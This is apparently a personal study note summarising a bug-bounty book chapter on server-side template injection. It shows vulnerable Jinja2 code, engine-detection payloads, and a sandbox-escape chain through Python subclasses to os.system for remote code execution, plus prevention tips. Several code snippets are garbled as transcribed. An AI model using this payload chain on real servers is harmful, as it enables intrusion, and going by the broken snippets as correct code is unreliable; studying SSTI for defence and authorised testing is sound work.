Template Engines are software that are used to determinate design of a webpage. 
Programmers often overlook **SSTI (Server-Side Template Injection)**, but they have pretty sever consequences. For example [[TurtleBB/Dictionary/RCE]]. They're getting much more popular right now and they're slowly becoming staple owasp top 10..

### **Mechanisms**
To understand Template injection you must first understand their engines. To describe it the easiest way I would say that engine templates connect data of an application with templates and by doing so they generate webapps. They're created using template languages like Jinja. They allow programmers to specify how should the webpages render. Internet templates with template engines allow programmers to separate server-side logic from presentation on client side.

### **Template Engines**
Let us see the devil:
```
<html>
	<body>
	<h1>{{ list_title }} </h1>
	<h2>{{ list_description}} </h2>
	{% for item in item_list %}
		{{item}}
		{% if not loop.last %},{% endif %}
	{% endfor %}
	</body>
</html>
```
It looks like normal HTML. It contains special syntax referring content, that engine should interpret as part of a template. In Jinja every code put in brackets is interpreted as a python expression and code inserted between brackets and %% is interpreted as an python instruction.

In programming languages expression is a variable or function, which returns value and instruction is a code which doesn't return anything. Now programmer can connect template with python code to create complete HTML site
```
from jinja2 import Template
	with open('example.jinja') as f:
		 tmpl - Template(f.read())
	print(tmpl.render(
		list_title = € "Chapter Contents",
		list_description = @ "Here are the contents of chapter 16.",
		item list = € ["Mechanisms Of Template Injection", "Preventing Template Injection", "Hunting For Template Injection", \
"Escalating Template Injection", "Automating Template Injection", "Find Your First Template Injection!"]
))
```
First, the Python code reads the template file named example.jinja. It then generates an HTML page dynamically by providing the template with the values it needs. You can see that the code is rendering the template with the values provided in code.

The template engine will combine the data provided in the Python script and the template file example.jinja to create this HTML page:
```
<html> 
	<body> 
	<h1>Chapter Contents</h1>
	<h2>Here are the contents of chapter 16.</h2>
	Mechanisms Of Template Injection, Preventing Template Injection, Hunting For
	Template Injection, Escalating Template Injection, Automating Template Injection, 
	Find Your First Template Injection! 
</body>

</html>
```

Template engines make rendering web pages more efficient, because programmers can present different sets of data in a standardized way by reusing templates. 

Most popular template engines are: 
Jinja, Django and  Mako for python,
Smarty, Twig, for PHP
Apache FreeMarker, Apache Velocity for Java.


### **About vulnerability itself**
Template Injection happens when user can inject input data to template without any sanitization.
Above code is not possible to be exploited. Firstly due to luck of an input ofc. But even if we added user input:
```
from jinja2 import Template
with open('example.jinja') as f:
	tmpl = Template(f.read())
print (tmp1. render(
list title = user input.title,
list description = user input.description,
item list = user input.list,
))
```
It is still not exploitable. This is due to the fact that it is the safe way to do it. Sometimes programmers treat templates like a string and connect them directly with user input. That is when this vulnerability happens, because like with SQL Injection, engine cannot tell what is user input and what is code of a template from programmer.
Here is an example of abusable code:
```
from jinja2 import Template
tmpl - Template("
	<html><hi>The user's name is: " + user input + "</hi></htm1>") 
print(tmpl.render())
```
This codes make template by connecting html code and user data at line 3 and then renders it in line 4.
If user will use this payload:
```
GET /display_name?name={{1+1}} 
Host: example.com
```
The html output would be:
```
<html>
	<h1>NThe user's name is: 2</h1>
</html>
```

Besides doing math we can also use methods, and execute any kind of code that we want. Depending on the permissions of the application we could try to read files or even escalate our privileges in the system.

### **How to prevent template Injection**
Update frameworks/libraries and download patches for them. Prevent users from sending their own templates. Potentially you can use sandboxes so that you can "safely" open user templates. Sandboxes are as safe as their configuration, so yeah. 

You can also create an allowlist. You should return only basic errors back to user, not the entire stacktrace so that hacker has smaller chance of understanding what they're achieving. And as always sanitize user inputs. And if it's possible try to not render user inputted data into templates.

### **How to find them?**
Look for places where you can input data.
Applications use template engines for generating custom email pages, or main pages based on data of an user. You should look for data that is fed back to user. Because they're similar in the ways in which you find them you can also refer to: [[XSS]].

Try to upload a payload. According to book author best first payload is this:
``{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]. 
This payload will work with many different engines.
You can also try inputting them one by one:
``${7*7}                       for java
``{{7*7}}                      for PHP and python
``<%= 7*7 %>                   for ERB?
If any of those will get us 49 as a response we won.

Remember that sometimes when you input those values in one place they can be escaped but in other they will be rendered as a template, so it can look like it prevents it, but it doesn't.

Maybe when sending group mail it will render it as a template and when sending it normally it will just use your whole script as a value?
The three test payloads ${7 * 7}, {{7 * 7}}, and <%= 7 * 7 %> would work when user input is inserted into the template as plaintext, as in this code snippet:
```
from jinja2 import Template
tmpl = Template(" 
<html><h1>The user's name is: " + user input + "«/hi»«/html»")print(tmpl.render())
```
But what if the user input is concatenated into the template as a part of the template's logic, as in this code snippet?
```
from jinja2 import Template
tmpl - Template("
<html><h1>The user's name is: {{" + user input + "))</h1></html>")print(tmpl.render())
```
In the above case you should be able to just input 7 * 7, because the programmer tried to help us do template injection. Sometimes those situation happen. You know don't have to guess which kind of engine it is and based on that prepare a payload. Now you have to enter expression of PoC.


Then if you could get back result of your expression you should try to examine what type of template engine is running on the application. To further exploit the app you will have to know that.
If your payload caused an error, the error message itself may contain the name of the template engine. For example, submitting test string to our example Python application would cause a descriptive error that tells us that the application is using Jinja2
test string:
``{{1+abcxx}}${1+abcxx}<%1+abcxx%>[abcxx]
error message:
``jinja2.exceptions.UndefinedError: 'abcxx' is undefined

You can also run specific payloads that target only specific engines. Payload that will work will probably tell you which engine is running or at least how to look further for this information.

### **Escalation**
Most of the times you can just use maths to prove that you can do injection (like above), but sometimes people will PoC of you doing actual serious damage. Your method of escalation depends on the target engine and Programming Language used in it. We will only go through Jinja2, because author of book only provides information about exploiting this engine and because I want to go to sleep today.

How can we make RCE in the previously discussed example?
```
from jinja2 import Template
tmpl = Template(" 
<html><h1>The user's name is: " + user input + "«/hi»«/html»")
print(tmpl.render())
```
We can use command line in python by using:
``os.system('command')
But if you will provide this as an input you will get an error in return, cause there is no 'os' defined in the template environment. We can always try to import the module. There are three ways to import modules.
``import Module
``from Module import *
``_import_('module')
So we can try:
```
GET /display_name?name={{os.system('1s')}} 
Host: example.com
```
And we will get an error:
``jinja2.exceptions.UndefinedError: 'os' is undefined
This happens because you can't import modules in Jinja templates. Almost always template engines will block usage of dangerous functions such as import or it will have allowlist of functions which can be executed. We have to escape the sandbox.

### **ESCAPING THE SANDBOX**
We have to use default python functions to escape. Many of those default functions is integrated into part of Pythons object class, which means that you can just create object and use them as that object methods.
For example, the following GET request contains Python code that lists the Python classes available:
```
GET /display name?name-"(([[]._class_._bases_[0]._subclasses_()}}"
Host: example.com
```
What happened here?
First we create empty list and we refer to its attribute class, which refers as to list class. Next we use base attribute to refer to base classes of list. They return as a tuple and we try to access first one of them by using index 0. This refers us to an object and then we try to refer to its subclasses.

When we sent this payload we will get something like that in return:
```
[<class 'type'», «class 'weakref'», «class 'weakcallableproxy'», «class ‘weakproxy'>, «class 'int'>, «class 'bytearray'>, «class 'bytes'», «class 'list'>, «class 'NoneType'», «class 'NotImplementedType'>, <class 'traceback'», «class 'super'», «class 'range'>, «class 'dict'>, «class 'dict keys'>, «class 'dict values'», «class 'dict items'», «class 'dict reverse keyiterator'>, «class 'dict reversevalueiterator'>, «class 'dict reverseitem iterator'», «class 'odict iterator'», «class 'set'>, «class 'str'>, <class 'slice'», «class 'staticmethod'>, «class 'complex'», «class 'float'», <class 'frozenset'>, «class 'property'>, «class 'managedbuffer'», <class ‘memory view'>, «class 'tuple'>, «class 'enumerate'>, «class 'reversed'>, <class 'stderrprinter'>, «class 'code'>, «class 'frame'», «class 'builtin function | or method'», «class 'method'», «class 'function'>...]
```
The import function, which can be used to import modules, is one of Python’s built-in functions. But since Jinja2 is blocking its direct access, you will need to access it via the builtins module. This module provides direct access to all of Python's builtin classes and functions. Most Python modules have builtins as an attribute that refers to the built-in module, so you can recover the builtins module by referring to the builtins attribute.

Within all the subclasses there is a class named catch warnings. This is the subclass we'll use to construct our exploit. To find the catch warnings subclass, inject a loop into the template code to look for it:
```
{% for x in []._class_._bases_[0]._subclasses_() %}
{% if 'catch warnings' in x._name_%} 
{{x()._module._builtins_}}
{%endif%}
{%endfor%}
```

This loop goes through all the subclasses and finds the one with the string catch warnings in its name. Then it instantiates an object of that class. Objects of the class have an attribute called module that refers to the warnings module. Finally, we use the reference to the module to refer to the builtins module:
```
(' name ': 'builtins', ' doc ': "Built-in functions, exceptions, and other objects.
nNoteworthy: None is the 'nil' object; Ellipsis represents '...' in slices.", ' package ': '', ' loader ': «class ' frozen importlib.BuiltinImporter'», ' spec ': ModuleSpec(name'builtins', loader-«class ' frozen importlib.BuiltinImporter'»), ' build class ^": «built-in function build class », ' import ^": «built-in function — import >, 'abs': «built-in, function abs», 'all': «built-in function all>, 'any': «built-in function any», ‘ascii’: <built-in function ascii», 'bin': «built-in function bin», 'breakpoint': «built-in function breakpoint>, 'callable': «built-in function callable», 'chr': «built-in function chr», 'compile': «built-in function compile», 'delattr': «built-in function delattr>, 'dir': «built-in function dir», 'divmod': «built-in function divmod>, 'eval': «built-in function eval>, 'exec': «built-in function exec», 'format': «built-in function format», 'getattr': <built-in function getattr>, 'globals': «built-in function globals>, 'hasattr': «built-in function hasattr», 'hash': «built-in function hash», 'hex': «built-in function heo, 'id': «built-in function id», 'input': «built-in function input», 'isinstance': «built-in function isinstance>, 'issubclass': «built-in function issubclass>, 'iter': «built-in function iter», 'len': «built-in function len», 'locals': «built-in function locals», 'max': «built-in function max», 'min': «built-in function min», 'next': «built-in function next», 'oct': «built-in function oct», 'ord': «built-in function ord», 'pow': «built-in function pow», 'print': «built-in function print», 'repr': «built-in function repr», 'round': «built-in function round», 'setattr': «built-in function setattr>, 'sorted': «built-in function sorted», 'sum': «built-in function sum», 'vars': «built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': «class 'bool'», 'memoryview': «class 'memoryview'>, 'bytearray': «class 'bytearray'>, 'bytes': «class 'bytes'>, 'classmethod': «class 'classmethod'>, ...}
```
And in that mess of available functions we finally found our lovely import. Now lets use our new found import:
```
{% for x in []._class_._bases_[0]._subclasses_() %}
{% if 'catch warnings' in x._name_%} 
{{x()._module._builtins_['_import_']('os')}}
{%endif%}
{%endfor%}
```
Voila, we imported "command line" to our code. We can try to do some PoC with it:
```
{% for x in []._class_._bases_[0]._subclasses_() %}
{% if 'catch warnings' in x._name_%} 
{{x()._module._builtins_['_import_']('os').system('ls')}}
{%endif%}
{%endfor%}
```
Or maybe with new found files we can exploit it even further?


More about python sandbox escaping below:
CTF Wiki, Attps://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/ python-sandbox-escape/
HackTricks, https://book.hacktricks.xyz/misc/basic-python/ bypass-python-sandboxes/
Programmer Help, https://programmer.help/blogs/python-sandbox-escape.html
#### **REMEMBER**
Always remember to never destroy any files and never execute code that damages target system. Best way to do PoC is to make a file in target system that is named something like:
``template_injection_by_TurtleBB_Bug_Bounty.txt

### **Automation**
Creating exploits for every target system might be time-consuming Lucky for us template engines often contain very renown exploits and payloads. And if they're renown someone probably automated that.

One of the tools for automation of injecting template is tplmap, which allows to scan target looking for template injection. It also allows us to tell which engine is used and will help us with constructing our payloads. This tool doesn't help with every engine that we can find on the market, but for the most renown it is seriously helpful.


